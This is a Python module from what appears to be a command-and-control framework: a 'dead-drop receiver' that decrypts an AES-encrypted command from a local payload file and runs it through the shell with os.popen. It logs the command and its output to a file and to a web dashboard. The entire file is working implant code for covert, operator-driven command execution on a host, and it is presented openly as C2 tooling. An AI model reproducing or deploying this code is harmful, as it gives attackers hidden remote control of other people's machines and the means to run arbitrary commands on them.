#!/usr/bin/env python3
# File: modules/c2/dead_drop_receiver.py

import os
import json
import base64
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

CONFIG_FILE = "configs/dead_drop_config.json"
PAYLOAD_FILE = "payloads/command.txt"
LOG_FILE = "logs/dead_drop_receiver.log"
ALERT_FILE = "webgui/alerts.json"

# Ensure required folders exist
Path("configs").mkdir(parents=True, exist_ok=True)
Path("payloads").mkdir(parents=True, exist_ok=True)
Path("logs").mkdir(parents=True, exist_ok=True)
Path("webgui").mkdir(parents=True, exist_ok=True)

# Generate default AES config if missing
if not Path(CONFIG_FILE).exists():
    key = os.urandom(16)
    iv = os.urandom(16)
    config = {
        "aes_key": base64.b64encode(key).decode(),
        "aes_iv": base64.b64encode(iv).decode(),
        "mode": "CBC"
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

# Log function
def log_event(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.utcnow()}] {msg}\n")
    print(msg)

# Alert to dashboard
def append_alert(alert):
    try:
        if Path(ALERT_FILE).exists():
            with open(ALERT_FILE, "r") as f:
                alerts = json.load(f)
        else:
            alerts = []
        alerts.append(alert)
        with open(ALERT_FILE, "w") as f:
            json.dump(alerts, f, indent=2)
    except Exception as e:
        log_event(f"[!] Alert write failed: {e}")

# Decrypt AES payload
def decrypt_payload():
    try:
        with open(CONFIG_FILE) as f:
            config = json.load(f)
        key = base64.b64decode(config["aes_key"])
        iv = base64.b64decode(config["aes_iv"])

        with open(PAYLOAD_FILE, "rb") as f:
            encrypted_b64 = f.read()
        encrypted_data = base64.b64decode(encrypted_b64)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted.decode()
    except Exception as e:
        log_event(f"[!] Decryption failed: {e}")
        return None

# Execute command and log
def execute_command(cmd):
    try:
        log_event(f"[+] Executing: {cmd}")
        output = os.popen(cmd).read()
        log_event(f"[+] Output:\n{output}")
        append_alert({
            "timestamp": datetime.utcnow().isoformat(),
            "type": "dead_drop_command",
            "status": "executed",
            "command": cmd,
            "output": output.strip()
        })
    except Exception as e:
        log_event(f"[!] Execution failed: {e}")

# MAIN ENTRY
if __name__ == "__main__":
    log_event("[*] Dead-Drop Receiver Activated")
    cmd = decrypt_payload()
    if cmd:
        execute_command(cmd)
        log_event("[✓] Task completed.")
    else:
        log_event("[!] No valid payload found.")
